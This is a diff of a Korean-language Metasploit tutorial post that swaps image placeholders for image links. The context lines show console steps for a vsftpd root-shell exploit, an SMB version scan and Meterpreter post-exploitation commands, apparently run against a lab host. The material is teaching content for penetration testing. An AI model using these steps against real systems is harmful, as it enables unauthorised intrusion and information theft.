@@ -56,7 +56,7 @@ msf6 exploit(...) > set RHOSTS 192.9.200.11
 # 6. 공격 실행
 msf6 exploit(...) > exploit
 ```
-[여기에 Metasploit vsftpd 공격 성공 이미지 삽입]
+   ![MetasploitVsftpd](/assets/images/Meta_1.png)
 
 `exploit` 명령 실행 후 익스플로잇이 성공하면 대상 서버의 `root` 권한 쉘이 획득된 것을 확인할 수 있다. `whoami` 명령어를 통해 이를 증명할 수 있다.
 
@@ -77,7 +77,7 @@ msf6 auxiliary(...) > set RHOSTS 192.9.200.11
 # 3. 스캐너 실행
 msf6 auxiliary(...) > run
 ```
-[여기에 Metasploit SMB 스캔 결과 이미지 삽입]
+   ![MetasploitSmb](/assets/images/Meta_2.png)
 
 `run` 명령 실행 후 대상 서버의 운영체제 정보와 Samba 버전 정보가 출력된다. 이 정보는 추후 해당 버전에 맞는 익스플로잇을 찾는 데 사용될 수 있다.
 
@@ -125,7 +125,7 @@ msf6 exploit(...) > exploit
     screenshot  # 대상 PC의 현재 화면을 스크린샷으로 캡처
     ```
 
-[여기에 Meterpreter 세션 획득 및 명령어 실행 이미지 삽입]
+   ![MetasploitSession](/assets/images/Meta_3.png)
 
 이처럼 Meterpreter는 단순한 원격 제어를 넘어 시스템을 분석하고 정보를 탈취하며 공격의 흔적을 숨기는 등 고도화된 침투 테스트 작업을 효율적으로 수행할 수 있는 환경을 제공한다.
 
